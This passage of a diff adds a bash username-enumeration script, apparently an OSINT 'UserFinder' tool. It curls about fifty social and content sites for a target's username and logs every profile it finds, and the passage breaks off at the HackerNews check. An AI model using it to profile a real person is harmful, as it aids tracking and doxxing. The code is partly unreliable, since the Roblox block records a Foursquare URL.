+    check1=$(curl -s -i "https://www.reddit.com/user/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | head -n1 | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.reddit.com/user/%s\n" $targetNAME
+      printf "https://www.reddit.com/user/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## WORDPRESS
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Wordpress: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.wordpress.com" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'Do you want to register' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.wordpress.com\n" $targetNAME
+      printf "https://%s.wordpress.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## PINTEREST
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Pinterest: ${resetT}"
+    check1=$(curl -s -i "https://www.pinterest.com/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '?show_error' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.pinterest.com/%s\n" $targetNAME
+      printf "https://www.pinterest.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## GITHUB
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Github: ${resetT}"
+    check1=$(curl -s -i "https://www.github.com/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.github.com/%s\n" $targetNAME
+      printf "https://www.github.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## TUMBLR
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Tumblr: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.tumblr.com" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.tumblr.com\n" $targetNAME
+      printf "https://%s.tumblr.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## FLICKR
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Flickr: ${resetT}"
+    check1=$(curl -s -i "https://www.flickr.com/people/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.flickr.com/photos/%s\n" $targetNAME
+      printf "https://www.flickr.com/photos/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## STEAM
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Steam: ${resetT}"
+    check1=$(curl -s -i "https://steamcommunity.com/id/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'The specified profile could not be found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://steamcommunity.com/id/%s\n" $targetNAME
+      printf "https://steamcommunity.com/id/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## VIMEO
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Vimeo: ${resetT}"
+    check1=$(curl -s -i "https://vimeo.com/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://vimeo.com/%s\n" $targetNAME
+      printf "https://vimeo.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+
+    ## SoundCloud
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] SoundCloud: ${resetT}"
+    check1=$(curl -s -i "https://soundcloud.com/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 Not Found'; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://soundcloud.com/%s\n" $targetNAME
+      printf "https://soundcloud.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## DISQUS
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Disqus: ${resetT}"
+    check1=$(curl -s -i "https://disqus.com/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 NOT FOUND' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://disqus.com/%s\n" $targetNAME
+      printf "https://disqus.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## MEDIUM
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Medium: ${resetT}"
+    check1=$(curl -s -i "https://medium.com/@$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://medium.com/@%s\n" $targetNAME
+      printf "https://medium.com/@%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## DEVIANTART
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] DeviantART: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.deviantart.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.deviantart.com\n" $targetNAME
+      printf "https://%s.deviantart.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## VK
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] VK: ${resetT}"
+    check1=$(curl -s -i "https://vk.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://vk.com/%s\n" $targetNAME
+      printf "https://vk.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## About.me
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] About.me: ${resetT}"
+    check1=$(curl -s -i "https://about.me/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://about.me/%s\n" $targetNAME
+      printf "https://about.me/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Spotify
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Spotify: ${resetT}"
+    check1=$(curl -s -i "https://open.spotify.com/user/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://open.spotify.com/user/%s\n" $targetNAME
+      printf "https://open.spotify.com/user/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## MixCloud
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] MixCloud: ${resetT}"
+    check1=$(curl -s -i "https://www.mixcloud.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'error-message' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.mixcloud.com/%s\n" $targetNAME
+      printf "https://www.mixcloud.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Scribd
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Scribd: ${resetT}"
+    check1=$(curl -s -i "https://www.scribd.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'show_404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.scribd.com/%s\n" $targetNAME
+      printf "https://www.scribd.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Badoo
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Badoo: ${resetT}"
+    check1=$(curl -s -i "https://www.badoo.com/en/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.badoo.com/en/%s\n" $targetNAME
+      printf "https://www.badoo.com/en/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    # Patreon
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Patreon: ${resetT}"
+    check1=$(curl -s -i "https://www.patreon.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.patreon.com/%s\n" $targetNAME
+      printf "https://www.patreon.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## BitBucket
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] BitBucket: ${resetT}"
+    check1=$(curl -s -i "https://bitbucket.org/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://bitbucket.org/%s\n" $targetNAME
+      printf "https://bitbucket.org/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## CashMe
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] CashMe: ${resetT}"
+    check1=$(curl -s -i "https://cash.me/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found'; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://cash.me/%s\n" $targetNAME
+      printf "https://cash.me/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Behance
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Behance: ${resetT}"
+    check1=$(curl -s -i "https://www.behance.net/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found'; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.behance.net/%s\n" $targetNAME
+      printf "https://www.behance.net/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## GoodReads
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] GoodReads: ${resetT}"
+    check1=$(curl -s -i "https://www.goodreads.com/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.goodreads.com/%s\n" $targetNAME
+      printf "https://www.goodreads.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Instructables
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Instructables: ${resetT}"
+    check1=$(curl -s -i "https://www.instructables.com/member/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 NOT FOUND' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.instructables.com/member/%s\n" $targetNAME
+      printf "https://www.instructables.com/member/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## KeyBase
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Keybase: ${resetT}"
+    check1=$(curl -s -i "https://keybase.io/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://keybase.io/%s\n" $targetNAME
+      printf "https://keybase.io/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Kongregate
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Kongregate: ${resetT}"
+    check1=$(curl -s -i "https://kongregate.com/accounts/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://kongregate.com/accounts/%s\n" $targetNAME
+      printf "https://kongregate.com/accounts/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Livejournal
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] LiveJournal: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.livejournal.com" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.livejournal.com\n" $targetNAME
+      printf "https://%s.livejournal.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## AngelList
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] AngelList: ${resetT}"
+    check1=$(curl -s -i "https://angel.co/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://angel.co/%s\n" $targetNAME
+      printf "https://angel.co/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Last.fm
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] last.fm: ${resetT}"
+    check1=$(curl -s -i "https://last.fm/user/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://last.fm/user/%s\n" $targetNAME
+      printf "https://last.fm/user/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Dribbble
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Dribbble: ${resetT}"
+    check1=$(curl -s -i "https://dribbble.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://dribbble.com/%s\n" $targetNAME
+      printf "https://dribbble.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Codecademy
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Codecademy: ${resetT}"
+    check1=$(curl -s -i "https://www.codecademy.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.codecademy.com/%s\n" $targetNAME
+      printf "https://www.codecademy.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Gravatar
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Gravatar: ${resetT}"
+    check1=$(curl -s -i "https://en.gravatar.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://en.gravatar.com/%s\n" $targetNAME
+      printf "https://en.gravatar.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Pastebin
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Pastebin: ${resetT}"
+    check1=$(curl -s -i "https://pastebin.com/u/$targetNAME" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'location: /index' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://pastebin.com/u/%s\n" $targetNAME
+      printf "https://pastebin.com/u/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Foursquare
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Foursquare: ${resetT}"
+    check1=$(curl -s -i "https://foursquare.com/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://foursquare.com/%s\n" $targetNAME
+      printf "https://foursquare.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Roblox
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Roblox: ${resetT}"
+    check1=$(curl -s -i "https://www.roblox.com/user.aspx?username=$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://foursquare.com/%s\n" $targetNAME
+      printf "https://foursquare.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Gumroad
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Gumroad: ${resetT}"
+    check1=$(curl -s -i "https://www.gumroad.com/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.gumroad.com/%s\n" $targetNAME
+      printf "https://www.gumroad.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Newgrounds
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Newgrounds: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.newgrounds.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.newgrounds.com\n" $targetNAME
+      printf "https://%s.newgrounds.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Wattpad
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Wattpad: ${resetT}"
+    check1=$(curl -s -i "https://www.wattpad.com/user/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.wattpad.com/user/%s\n" $targetNAME
+      printf "https://www.wattpad.com/user/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Canva
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Canva: ${resetT}"
+    check1=$(curl -s -i "https://www.canva.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.canva.com/%s\n" $targetNAME
+      printf "https://www.canva.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## CreativeMarket
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] CreativeMarket: ${resetT}"
+    check1=$(curl -s -i "https://creativemarket.com/$targetNAME" -H "Accept-Language: en" -L | grep -o '404eef72' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://creativemarket.com/%s\n" $targetNAME
+      printf "https://creativemarket.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Trakt
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Trakt: ${resetT}"
+    check1=$(curl -s -i "https://www.trakt.tv/users/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.trakt.tv/users/%s\n" $targetNAME
+      printf "https://www.trakt.tv/users/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## 500px
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] 500px: ${resetT}"
+    check1=$(curl -s -i "https://500px.com/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://500px.com/%s\n" $targetNAME
+      printf "https://500px.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Buzzfeed
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Buzzfeed: ${resetT}"
+    check1=$(curl -s -i "https://buzzfeed.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://buzzfeed.com/%s\n" $targetNAME
+      printf "https://buzzfeed.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## TripAdvisor
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] TripAdvisor: ${resetT}"
+    check1=$(curl -s -i "https://tripadvisor.com/members/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://tripadvisor.com/members/%s\n" $targetNAME
+      printf "https://tripadvisor.com/members/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## HubPages
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] HubPages: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.hubpages.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.hubpages.com/\n" $targetNAME
+      printf "https://%s.hubpages.com/\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Contently
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Contently: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.contently.com" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.contently.com\n" $targetNAME
+      printf "https://%s.contently.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Houzz
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Houzz: ${resetT}"
+    check1=$(curl -s -i "https://houzz.com/user/$targetNAME" -H "Accept-Language: en" -L | grep -o 'an error has occurred' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://houzz.com/user/%s\n" $targetNAME
+      printf "https://houzz.com/user/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## blip.fm
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] blip.fm: ${resetT}"
+    check1=$(curl -s -i "https://blip.fm/$targetNAME" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://blip.fm/%s\n" $targetNAME
+      printf "https://blip.fm/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Wikipedia
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Wikipedia: ${resetT}"
+    check1=$(curl -s -i "https://www.wikipedia.org/wiki/User:$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.wikipedia.org/wiki/User:%s\n" $targetNAME
+      printf "https://www.wikipedia.org/wiki/User:%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## HackerNews
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] HackerNews: ${resetT}"
